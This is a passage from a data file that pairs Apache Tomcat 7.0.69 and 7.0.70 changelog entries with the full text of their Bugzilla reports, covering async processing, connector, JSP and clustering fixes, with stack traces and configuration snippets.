http://localhost:8080/AsyncDebugListener/ltest?reps=3

2) Timeout, no flush - works correctly:

http://localhost:8080/AsyncDebugListener/ltest?reps=3&timeout

3) Flush before timeout - error case:

http://localhost:8080/AsyncDebugListener/ltest?reps=3&timeout&flush

From the logs, you will see that AsyncListener#onTimeout() was called, but  
AsyncListener#onComplete() was not.

Thanks for having a look at this!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59220
Catalina|Tomcat 7.0.70 (violetagg)|fix|59261|ServletRequest.getAsyncContext() now throws an IllegalStateException as required by the Servlet specification if the request is not in asynchronous mode when called. (markt)|Request getAsyncContext should throw IllegalStateException if async is not started|"If ServletRequest.getAsyncContext() IllegalStateException is invoked and has not been put into asynchronous mode an . From the javadoc [1]:

> Throws: IllegalStateException - if this request has not been put into
> asynchronous mode, i.e., if neither startAsync() nor 
> startAsync(ServletRequest,ServletResponse) has been called

For implementations of HttpServletRequestWrapper that override this method, the fact that result can be null can cause problems [2]. It appears there are parts of tomcat that check if getAsyncContext() is null rather than checking isAsycStarted(). For example, ApplicationDispatcher checks if getAsyncContext() is null.


[1] http://docs.oracle.com/javaee/6/api/javax/servlet/ServletRequest.html#getAsyncContext()
[2] https://github.com/spring-cloud/spring-cloud-netflix/issues/868"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59261
Catalina|Tomcat 7.0.70 (violetagg)|fix|59310|Do not add a Content-Length: 0 header for custom responses to HEAD requests that do not set a Content-Length value. (markt)|Content-Length of HEAD requests incorrectly computed as 0|"When responding to a HEAD request without streaming the entity and without setting the Content-Length, the Content-Length is incorrectly computed to be zero in org.apache.catalina.connector.OutputBuffer.close(). This is incorrect. The Content-Length header should be unset in this case.

RFC 7230 doesn't require the Content-Length to be set on HEAD requests, but if it set it must be the size of the corresponding GET. So ""Content-Length: 0"" violates the standard.

Computing the real size would be excessively expensive in our use case because this would require to transfer data from a backend system."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59310
Catalina|Tomcat 7.0.70 (violetagg)|fix||When normalizing paths, improve the handling when paths end with /. or /.. and ensure that input and output are consistent with respect to whether or not they end with /. (markt)|||
Catalina|Tomcat 7.0.70 (violetagg)|fix|59317|Ensure that HttpServletRequest.getRequestURI() returns an encoded URI rather than a decoded URI after a dispatch. (markt)|AsyncContextImpl breaks request URL containing spaces|"The problem appears when performing async requests to URLs that contain a space in URI path. I have an application that performs an XHR POST to http://localhost:8080/api/alarms/:id. When I set id to 'foo bar' I get an error:


java.lang.IllegalStateException: Could not get HttpServletRequest URI: Illegal character in path at index 36: http://localhost:8080/api/alarms/foo bar
	at org.springframework.http.server.ServletServerHttpRequest.getURI(ServletServerHttpRequest.java:99)
	at org.springframework.web.util.UriComponentsBuilder.fromHttpRequest(UriComponentsBuilder.java:282)
	at org.springframework.web.util.WebUtils.isSameOrigin(WebUtils.java:814)
	at org.springframework.web.cors.DefaultCorsProcessor.processRequest(DefaultCorsProcessor.java:71)
	at org.springframework.web.servlet.handler.AbstractHandlerMapping$CorsInterceptor.preHandle(AbstractHandlerMapping.java:503)
	at org.springframework.web.servlet.HandlerExecutionChain.applyPreHandle(HandlerExecutionChain.java:134)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:954)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:893)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:968)
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:870)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:648)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:844)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:729)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:292)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:720)
	at org.apache.catalina.core.ApplicationDispatcher.doDispatch(ApplicationDispatcher.java:639)
	at org.apache.catalina.core.ApplicationDispatcher.dispatch(ApplicationDispatcher.java:605)
	at org.apache.catalina.core.AsyncContextImpl$1.run(AsyncContextImpl.java:229)
	at org.apache.catalina.core.AsyncContextImpl.doInternalDispatch(AsyncContextImpl.java:391)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:208)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:106)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:141)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:616)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:88)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:392)
	at org.apache.coyote.http11.AbstractHttp11Processor.asyncDispatch(AbstractHttp11Processor.java:1715)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:652)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1502)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1458)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.net.URISyntaxException: Illegal character in path at index 36: http://localhost:8080/api/alarms/foo bar
	at java.net.URI$Parser.fail(URI.java:2848)
	at java.net.URI$Parser.checkChars(URI.java:3021)
	at java.net.URI$Parser.parseHierarchical(URI.java:3105)
	at java.net.URI$Parser.parse(URI.java:3053)
	at java.net.URI.<init>(URI.java:588)
	at org.springframework.http.server.ServletServerHttpRequest.getURI(ServletServerHttpRequest.java:96)
	... 35 common frames omitted


Non-async requests don't cause any problem. I use Spring Framework 4.2.5.

Debugging revealed what happens:

URI constructor expects an escaped URI (/api/alarms/foo%20bar). When AsyncDispatcher runs, it passes a ServletRequest implementation which getRequestURI() returns /api/alarms/foo bar. Non-async request handling passes an implementation that returns the escaped URI.

AsyncContextImpl.dispatch() constructs a path from HttpServletRequest.getServletPath() and getPathInfo().
This path is used in ApplicationContext.getRequestDispatcher() where ApplicationDispatcher constructor is called with the path where it a request URI is expected.

Later ApplicationDispatcher.wrapRequest() creates an ApplicationHttpRequest with a correct request URI but ApplicationDispatcher.doDispatch() calls wrequest.setRequestURI() passing a path not a URI.

As result the servlet handling the request receives an ApplicationHttpRequest with an incorrect requestURI field ( identical to servletPath field), despite including a RequestFacade in the request field that returns the correct (escaped) value in getRequestURI().

I reproduced the bug on Tomcat 8.0.22, 8.0.30, 8.0.33 and 8.5.0 beta."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59317
Catalina|Tomcat 7.0.70 (violetagg)|fix||Ensure that the value for the header X-Frame-Options is constructed correctly according to the specification when ALLOW-FROM option is used. (violetagg)|||
Catalina|Tomcat 7.0.70 (violetagg)|add|59399|Add a new option to the Realm implementations that ship with Tomcat that allows the HTTP status code used for HTTP -> HTTPS redirects to be controlled per Realm. (markt)|Tomcat doesn't support setting the response code for http -> https redirect|"Product: apache-tomcat-7.0.42
Version: 7-0.42
Component: Connector (guess)
Platform: x86_64
OS: Ubuntu Linux 12.04.2 LTS and CentOS Linux release 7.2.1511
Severity: enhancement
Java: jdk1.8.0_77

Tomcat 7.0.42 used as standalone web server port 80
configured with 

<transport-guarantee>CONFIDENTIAL</transport-guarantee> in web.xml

and 

<Connector port=""80"" protocol=""HTTP/1.1""
           connectionTimeout=""20000""
           redirectPort=""443"" />

<Connector port=""443"" maxThreads=""150"" scheme=""https"" secure=""true""
           SSLEnabled=""true"" keystoreFile=""/opt/keys/tomcat.keystore"" 
           keystorePass=""?"" clientAuth=""false"" keyAlias=""tomcat"" sslProtocol=""TLS"" />   

in server.xml

# curl -D /tmp/headers.txt -s http://localhost
# cat headers.txt

HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
...
It doesn't seem to be possible to configure the response code for the http -> https redirect. 

Discussions with Google webmasters reveal that Google require a 301 moved permanently response to the http -> https redirect. This is key to maintaining existing rankings

Unfortunately Tomcat returns 302 temporary redirect when performing the redirection.

Implementing site wide https is also crucial to maintaining rankings unfortunately the benefits of doing this are largley negated by the inability to return the required status code.The only option is to undeploy https thereby once again harming rankings. 

A good Google ranking is the difference between making a profit and making a loss. Much as I don't like it, that's the way it is unfortunately."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59399
Catalina|Tomcat 7.0.70 (violetagg)|fix|59449|In ContainerBase, ensure that the process to remove a child container is the reverse of the process to add one. Patch provided by Huxing Zhang. (markt)|org.apache.catalina.core.ContainerBase#removeChild remove order|"Created attachment 33832 [details]
patch to implement the proposed behaviour.

Hi, 

In org.apache.catalina.core.ContainerBase#addChildInternal,  we have the following execution order:

1. put child to children
2. call child' start
3. fire ADD_CHILD_EVENT

However, in org.apache.catalina.core.ContainerBase#removeChild, the execution order is not in reverse order:

1. remove child from children
2. call child's stop
3. fire REMOVE_CHILD_EVENT
4. call child's destroy if necessary 

This may lead to some unexpected behaviour. e.g. One can deploy a web app while it is being undeployed.

Proposed execution order  in removeChild:

1. call child's stop
2. call child's destroy if necessary 
3. remove child from children
4. fire REMOVE_CHILD_EVENT"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59449
Catalina|Tomcat 7.0.70 (violetagg)|fix||RMI Target related memory leaks are avoidable which makes them an application bug that needs to be fixed rather than a JRE bug to work around. Therefore, start logging RMI Target related memory leaks on web application stop. Add an option that controls if the check for these leaks is made. Log a warning if running on Java 9 with this check enabled but without the command line option it requires. (markt)|||
Catalina|Tomcat 7.0.70 (violetagg)|fix||Fix a potential concurrency issue with the web application class loader and concurrent reads and writes of the resource cache. (markt)|||
Catalina|Tomcat 7.0.70 (violetagg)|fix|59619|Within the web application class loader, always use path as the key for the resource cache to improve the hit ratio. This also fixes a problem exposed by the fix for 56777 that enabled file based configuration resources to be loaded from the class path. (markt)|Failed to read schema document 'classpath:/schema/shibboleth-2.0-services.xsd'|"http://marc.info/?t=146175486300004&r=1&w=2

Link to the discussion following this error.

Original email:

Tomcat version 7.0.69
Also happens on 7.0.68 and 7.0.67

I don‚Äôt get this error on 7.0.65

I have deployed an idp.war on tomcat
The idp.war has a service.xml file that looks like this at the beginning:


<srv:Services xmlns:srv=""urn:mace:shibboleth:2.0:services""
          xmlns:attribute-afp=""urn:mace:shibboleth:2.0:afp""
          xmlns:attribute-authority=""urn:mace:shibboleth:2.0:attribute:authority""
          xmlns:attribute-resolver=""urn:mace:shibboleth:2.0:resolver""
          xmlns:profile=""urn:mace:shibboleth:2.0:idp:profile-handler""
          xmlns:relyingParty=""urn:mace:shibboleth:2.0:relying-party""
          xmlns:resource=""urn:mace:shibboleth:2.0:resource""
          xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
          xsi:schemaLocation=""urn:mace:shibboleth:2.0:services classpath:/schema/shibboleth-2.0-services.xsd
                              urn:mace:shibboleth:2.0:afp classpath:/schema/shibboleth-2.0-afp.xsd
                              urn:mace:shibboleth:2.0:attribute:authority classpath:/schema/shibboleth-2.0-attribute-authority.xsd
                              urn:mace:shibboleth:2.0:resolver classpath:/schema/shibboleth-2.0-attribute-resolver.xsd
                              urn:mace:shibboleth:2.0:idp:profile-handler classpath:/schema/shibboleth-2.0-idp-profile-handler.xsd
                              urn:mace:shibboleth:2.0:relying-party classpath:/schema/shibboleth-2.0-relying-party.xsd
                              urn:mace:shibboleth:2.0:resource classpath:/schema/shibboleth-2.0-resource.xsd‚Äù>

The stack complains that it cannot find the first schemaLocation listed but if I go to the deployed idp folder in tomcat idp/WEB-INF/lib/ there are jars there, one of which is shibboleth-common-1.2.1.jar

Which has the path /schema/ containing all those listed schemaLocations from the service.xml

I can move all the jars from idp/WE-INF/lib/ to tomcat7.0.69/lib/ and the exception goes away but I haven‚Äôt had to do this prior to .67"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59619
Catalina|Tomcat 7.0.70 (violetagg)|fix||Fix error message when failed to register MBean. (kfujino)|||
Coyote|Tomcat 7.0.70 (violetagg)|fix|58970|Fix a connection counting bug in the NIO connector that meant some dropped connections were not removed from the current connection count. (markt)|http NIO connector crash after update from 8.0.27 to 8.0.30|"Created attachment 33531 [details]
Graph of network connection status during the crash of the connector

==============================
Environment:
Debian 8
Tomcat 8.0.30
Java Oracle JDK 1.8.0_72
Using connector NIO, current connector configuration:
    <Connector port=""8001"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
        connectionTimeout=""20000""
        acceptorThreadCount=""4""
        maxThreads=""200""
        maxConnections=""1000""
        maxKeepAliveRequests=""5000"" />
Hardware: different servers, Intel Xeon CPU with a total of 16 core (32 thread) memory per tomcat around 30GB, using G1GC.
==============================
What is happening:
Before the update, with Tomcat version 8.0.27, we didn't have any issue with the NIO connector, it was working fine and websocket too.
Since the update, the connector just ""crash"" after several hours of work: no request are then processed (websocket or http), trying to access any application from http://ip:8001/ just hangs. Looking at the state of the network socket, it is clearly not working (graph attached).

The http/NIO connector is used almost exclusively for websocket connections (the only connection that are not websocket are from our internal connector checker).

There is also an AJP/APR connector that is working fine during that time, even when the NIO/http connector crash.

I don't see anything in the catalina.out nor in the system log... 

I know this is difficult to debug with so little information, I only see this issue in production myself when there is a large number of connections, never in test.

The tomcat is behind an apache httpd 2.4 proxy, relevant configuration:
JkMount /APPNAME* server_tomcat1
ProxyPass /APPNAME/realtime/ ws://server.example.net:8001/APPNAME/realtime/
ProxyPassReverse /APPNAME/realtime/ ws://server.example.net:8001/APPNAME/realtime/"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58970
Coyote|Tomcat 7.0.70 (violetagg)|fix|59289|Do not recycle upgrade processors in unexpected close situations. (remm)|Upgrade processor is put in recycledProcessors stack of Http11NioProtocol.Http11ConnectionHandler|"We're using Tomcat in our product and facing issues with a few HTTP requests under traffic. Basically what happens is that incoming HTTP connection is terminated by Tomcat (TCP FIN or TCP RST packet is sent) right after HTTPS handshake is finished.

Each traffic iteration consists of the following:

1) 2000 Websocket connections used to pass data between the clients.
2) Some minor supporting HTTP traffic.

In the end of traffic iteration Websocket sessions are closing and, at the same time, some supporting HTTP traffic is processed by Tomcat. I was adding various logs to the Tomcat code and figured out that Tomcat attempts to process these failing HTTP requests with Upgrade processors (org.apache.coyote.http11.upgrade.NioProcessor).

I added the following logs:
1) AbstractProtocol.AbstractConnectionHandler.process right after processor is identified:

                if (processor.isUpgrade()) {
                   getLog().info(""AbstractConnectionHandler.process got processor from "" + processorSource + 
                         "". status = "" + status.name() + 
                         "", processor.id = "" + processor.getId());
                }

2) Http11NioProtocol.Http11ConnectionHandler.release (both, right before processor is recycled)

               if (processor.getId()  == -2) {
                  getLog().info(""Recycling upgrade processor in HTTP protocol.\n"", new Exception());
               }

note that I adde method getId to all processors. For regular HTTP processors it equals to request ID (which I also added). For upgrade processor (org.apache.coyote.http11.upgrade.NioProcessor) ID always equal to -2.

and here is the output I got right before failed HTTP request:

Apr 08, 2016 CDT 08:26:09.686 AM http-nio-135.60.87.90-443-ClientPoller-1 org.apache.coyote.http11.Http11NioProtocol
INFO: Recycling upgrade processor in HTTP protocol.


java.lang.Exception
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.release(Http11NioProtocol.java:200)
	at org.apache.tomcat.util.net.NioEndpoint$Poller.cancelledKey(NioEndpoint.java:953)
	at org.apache.tomcat.util.net.NioEndpoint$Poller.processKey(NioEndpoint.java:1135)
	at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1071)
	at java.lang.Thread.run(Thread.java:745)

....

Apr 08, 2016 CDT 08:26:09.710 AM http-nio-135.60.87.90-443-exec-106 org.apache.coyote.http11.Http11NioProtocol
INFO: AbstractConnectionHandler.process got processor from recycledProcessors map. status = OPEN_READ, processor.id = -2

So, what happens is - Poller adds NioProcessor to recycledProcessors stack of Http11NioProtocol.Http11ConnectionHandler and next HTTP request to Tomcat which is coming in is failing because Tomcat attempts to process it with NioProcessor instead of regular Http11NioProcessor.

If any additional logs are required to reproduce the issue  - please let me know. It seems like during normal operation such NioProcessors are just removed from commections map, for example here in AbstractProtocol.AbstractConnectionHandler.process method:
                    // Connection closed. OK to recycle the processor. Upgrade
                    // processors are not recycled.
                    connections.remove(socket);
                    if (processor.isUpgrade()) {
...

and are never expected to be recycled. And in case CancelledKeyException is thrown in Poller there's no check for upgrade processors and upgrade processor can be recycled."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59289
Coyote|Tomcat 7.0.70 (violetagg)|fix||Ensure that requests with HTTP method names that are not tokens (as required by RFC 7231) are rejected with a 400 response. (markt)|||
Coyote|Tomcat 7.0.70 (violetagg)|fix||When an asynchronous request is processed by the AJP connector, ensure that request processing has fully completed before starting the next request. (markt)|||
Coyote|Tomcat 7.0.70 (violetagg)|fix||If an async dispatch results in the completion of request processing, ensure that any remaining request body is swallowed before starting the processing of the next request else the remaining body may be read as the start of the next request leading to a 400 response. (markt)|||
Jasper|Tomcat 7.0.70 (violetagg)|fix||Fix a memory leak in the expression language implementation that caused the class loader of the first web application to use expressions to be pinned in memory. (markt)|||
Jasper|Tomcat 7.0.70 (violetagg)|fix|59654|Enforce the requirements of section 7.3.1 of the JSP specification regarding the permitted locations for TLD files. Patch provided by Huxing Zhang. (markt)|Jsp spec violation in tld identifying?|"What the spec says:
JSP.7.3.1 Identifying Tag Library Descriptors
...
TLD files should not be placed in /WEB-INF/classes or /WEB-INF/lib, and must not be placed inside /WEB-INF/tags or a subdirectory of it, unless named implicit.tld and intended to configure an implicit tag library with its JSP version and tlib-version.


Out test case:
We have simple web app with the following structure:

test
‚îú‚îÄ‚îÄ WEB-INF
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ classes
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ tags
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ test.tld
‚îî‚îÄ‚îÄ taglib.jsp

test.tld:

<?xml version=""1.0"" encoding=""UTf-8"" ?>

<taglib version=""2.0"">
  <description></description>
  <display-name></display-name>
  <tlib-version>1.0</tlib-version>
  <short-name>f</short-name>
  <function>
    <name>get</name>
    <function-class>java.lang.System</function-class>
    <function-signature>java.lang.String getProperty(java.lang.String)</function-signature>
  </function>
</taglib>

taglib.jsp:

<%@page contentType=""text/html;charset=UTF-8"" pageEncoding=""UTF-8""%>
<%@ taglib uri=""/WEB-INF/tags/test.tld"" prefix=""f""%>
<html>
<body>
	<h3>${f:get(""java.home"")}</h3>
</body>
</html>

Tomcat 7.0.69 behavior:
After deploying the test web app and visit http://localhost:8080/test/taglib.jsp, the jsp page gets compiled and java home has been correctly displayed.

Tomcat 8 & 9 trunk behavior:
When visiting http://localhost:8080/test/taglib.jsp, server responded with HTTP 500:

HTTP Status 500 - Unable to find taglib ""f"" for URI: /WEB-INF/tags/test.tld

org.apache.jasper.JasperException: Unable to find taglib ""f"" for URI: /WEB-INF/tags/test.tld
	org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:55)
	org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:277)
	org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:75)
	org.apache.jasper.compiler.TagLibraryInfoImpl.<init>(TagLibraryInfoImpl.java:183)
	org.apache.jasper.compiler.Parser.parseTaglibDirective(Parser.java:421)
	org.apache.jasper.compiler.Parser.parseDirective(Parser.java:479)
	org.apache.jasper.compiler.Parser.parseElements(Parser.java:1435)
	org.apache.jasper.compiler.Parser.parse(Parser.java:139)
	org.apache.jasper.compiler.ParserController.doParse(ParserController.java:227)
	org.apache.jasper.compiler.ParserController.parse(ParserController.java:100)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:199)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:356)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:336)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:323)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:585)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:363)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:396)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:340)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:729)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)


Conclusion:
Clearly the tomcat 7 behavior is against spec, which I think should be fixed.


Analysis:
After some digging, I found that the tld file is skipped during tld scan phase. However, when parsing tag lib directive, the org.apache.jasper.compiler.TagLibraryInfoImpl#generateTLDLocation didn't check the tld file location that is prohibited by spec.
Since the implementation is quite different between tomcat 7 % tomcat 8+. I found it hard to backport the tomcat 8 implementation to tomcat 7. Therefore, the fix should be specific to tomcat 7(tomcat 6 is not investigated.)


Proposed Fix:
Please refer to the attachment.
I've added a dedicated message to indicate such an behaivor is violating spec.

p.s. 
Should we also add the dedicated message to tomcat 8+ ? Because the message ""Unable to find taglib ""f"" for URI: /WEB-INF/tags/test.tld""  is somewhat confusing. The file does exist, it is the spec that requires tomcat not to load it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59654
WebSocket|Tomcat 7.0.70 (violetagg)|fix||Ensure that a client disconnection triggers the error handling for the associated WebSocket end point. (markt)|||
Web Applications|Tomcat 7.0.70 (violetagg)|fix||Correct a typo in SSL/TLS Configuration How-To. Issue reported via comments.apache.org. (violetagg)|||
Web Applications|Tomcat 7.0.70 (violetagg)|fix|58891|Update the SSL how-to. Based on a suggestion by Alexander Kj√§ll. (markt)|Bad and/or dangerous SSL/TLS documentation|"Created attachment 33465 [details]
improve SSL/TLS documentation

The current documentation gives really bad advise about how to handle SSL/TLS certificates that might even lead to peoples websites being attacked.

I have rewritten the documentation and fixed the following problems:

1) Encouragement of using self signed certificates.
2) Advise to mix SSL and non-SSL pages on the same site (this could easily lead to session cookie theft).
3) No information about HSTS
4) Outdated information about SNI and how the SSL/TLS handshake works.

Attached is a patch that rewrites the documentation"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58891
Tribes|Tomcat 7.0.70 (violetagg)|fix||Fix potential NPE that depends on the setting order of attributes of static member when using the static cluster. (kfujino)|||
Tribes|Tomcat 7.0.70 (violetagg)|add||Add get/set method for the channel that is related to ChannelInterceptorBase. (kfujino)|||
Tribes|Tomcat 7.0.70 (violetagg)|fix||As with the multicast cluster environment, in the static cluster environment, the local member inherits properties from the cluster receiver. (kfujino)|||
Tribes|Tomcat 7.0.70 (violetagg)|add||Add get/set method for the channel that is related to each Channel services. (kfujino)|||
Tribes|Tomcat 7.0.70 (violetagg)|add||"Add name to channel in order to identify channels. In tomcat cluster environment, it is set the cluster name + ""-Channel"" as default value. (kfujino)"|||
Tribes|Tomcat 7.0.70 (violetagg)|add||Add the channel name to the thread which is invoked by channel services in order to identify the associated channel. (kfujino)|||
Tribes|Tomcat 7.0.70 (violetagg)|fix||Ensure that clear the channel instance from channel services when stopping channel. (kfujino)|||
Tribes|Tomcat 7.0.70 (violetagg)|add||Implement map state in the replication map. (kfujino)|||
Tribes|Tomcat 7.0.70 (violetagg)|fix||Ensure that the ping is not executed during the start/stop of the replication map. (kfujino)|||
Tribes|Tomcat 7.0.70 (violetagg)|fix||In ping processing in the replication map, send not the INIT message but the newly introduced PING message. (kfujino)|||
jdbc-pool|Tomcat 7.0.70 (violetagg)|fix||Fix a memory leak with the pool cleaner thread that retained a reference to the web application class loader for the first web application to use a connection pool. (markt)|||
Other|Tomcat 7.0.70 (violetagg)|update||Update the packaged version of the Tomcat Native Library to 1.2.7 to pick up the Windows binaries that are based on OpenSSL 1.0.2h and APR 1.5.2. (violetagg/markt)|||
Other|Tomcat 7.0.70 (violetagg)|update||Remove native code (Windows Service Wrapper, APR/native connector) support for Windows Itanium. (markt)|||
Other|Tomcat 7.0.70 (violetagg)|update||Update the internal fork of Commons File Upload to r1743698 (1.3.1 plus additional fixes). (markt)|||
Other|Tomcat 7.0.70 (violetagg)|fix|58626|Add support for a new environment variable (USE_NOHUP) that causes nohup to be used when starting Tomcat. It is disabled by default except on HP-UX where it is enabled by default since it is required when starting Tomcat at boot on HP-UX. (markt)|Tomcat does not start at boot time due to SIGHUP|"When hooking Tomcat into the init.d of HP-UX, Tomcat does not come up at system start time. After an in-depth analysis of the startup scripts and HP-provided packages, we have noticed that the HP-UX init sends a SIGHUP to the startup script and child processes. Java does exit immediately.

One simple solution to this is to use nohup(1). Therefore, I'd like to propose to change the catalina.sh for ""start"" only which turns:
""$_RUNJAVA"" ""$LOGGING_CONFIG"" $LOGGING_MANAGER $JAVA_OPTS $CATALINA_OPTS
into
$JAVA_WRAPPER ""$_RUNJAVA"" ""$LOGGING_CONFIG"" $LOGGING_MANAGER $JAVA_OPTS $CATALINA_OPTS

Not quoting JAVA_WRAPPER is intentional because those who do not need a wrapper, the script won't fail on the empty argument.

Patches can be provided for Tomcat 6 and up."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58626
Catalina|Tomcat 7.0.69 (violetagg)|fix||Fix the type of InstanceManager attribute of mbean definition of StandardContext. (kfujino)|||
Catalina|Tomcat 7.0.69 (violetagg)|add|58351|Make the server build date and server version number accessible via JMX. Patch provided by Huxing Zhang. (markt)|Provide JMX access to server.built and server.number|"Created attachment 33087 [details]
patch to provide JMX access to server built and server number

We are able to obtain Server Info, Server Built, and Server Number by running ""catalina.sh version"",  those information are also logged to catalina.out by VersionLoggerListener. 
However, we cannot get Server Built and Server Number via JMX, which I think is inconsistent.
We should also provide JMX access to Server Built and Server Number."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58351
Catalina|Tomcat 7.0.69 (violetagg)|fix|59001|Correctly handle the case when Tomcat is installed on a path where one of the segments ends in an exclamation mark. (markt)|Unable to load jar files when they have exclamation in the path|"My workspace contains an exclamation in the path, unfortunately when Tomcat tries to load the jar files, entire path is broken into pieces when the second exclamation mark is encountered.

Let me know if you need more information.

This is the stacktrace -

Feb 12, 2016 11:45:27 PM org.apache.catalina.startup.TldConfig tldScanJar
WARNING: Failed to process JAR [jar:file:/G:/TEST!Maven!/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/test/WEB-INF/lib/asm-3.3.1.jar!/] for TLD files
java.io.FileNotFoundException: G:\TEST!Maven (The system cannot find the file specified)
	at java.util.zip.ZipFile.open(Native Method)
	at java.util.zip.ZipFile.<init>(ZipFile.java:219)
	at java.util.zip.ZipFile.<init>(ZipFile.java:149)
	at java.util.jar.JarFile.<init>(JarFile.java:166)
	at java.util.jar.JarFile.<init>(JarFile.java:103)
	at sun.net.www.protocol.jar.URLJarFile.<init>(URLJarFile.java:93)
	at sun.net.www.protocol.jar.URLJarFile.getJarFile(URLJarFile.java:69)
	at sun.net.www.protocol.jar.JarFileFactory.get(JarFileFactory.java:109)
	at sun.net.www.protocol.jar.JarURLConnection.connect(JarURLConnection.java:122)
	at sun.net.www.protocol.jar.JarURLConnection.getJarFile(JarURLConnection.java:89)
	at org.apache.tomcat.util.scan.FileUrlJar.<init>(FileUrlJar.java:41)
	at org.apache.tomcat.util.scan.JarFactory.newInstance(JarFactory.java:34)
	at org.apache.catalina.startup.TldConfig.tldScanJar(TldConfig.java:489)
	at org.apache.catalina.startup.TldConfig.access$100(TldConfig.java:59)
	at org.apache.catalina.startup.TldConfig$TldJarScannerCallback.scan(TldConfig.java:305)
	at org.apache.tomcat.util.scan.StandardJarScanner.process(StandardJarScanner.java:259)
	 at org.apache.tomcat.util.scan.StandardJarScanner.scan(StandardJarScanner.java:178)
	at org.apache.catalina.startup.TldConfig.execute(TldConfig.java:278)
	at org.apache.catalina.startup.TldConfig.lifecycleEvent(TldConfig.java:569)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5322)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:745)

Feb 12, 2016 11:45:27 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error getConfigured
Feb 12, 2016 11:45:27 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Context [/test] startup failed due to previous errors"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59001
Catalina|Tomcat 7.0.69 (violetagg)|fix||Expand the fix for 59001 to cover the special sequences used in Tomcat's custom jar:war: URLs. (markt)|Unable to load jar files when they have exclamation in the path|"My workspace contains an exclamation in the path, unfortunately when Tomcat tries to load the jar files, entire path is broken into pieces when the second exclamation mark is encountered.

Let me know if you need more information.

This is the stacktrace -

Feb 12, 2016 11:45:27 PM org.apache.catalina.startup.TldConfig tldScanJar
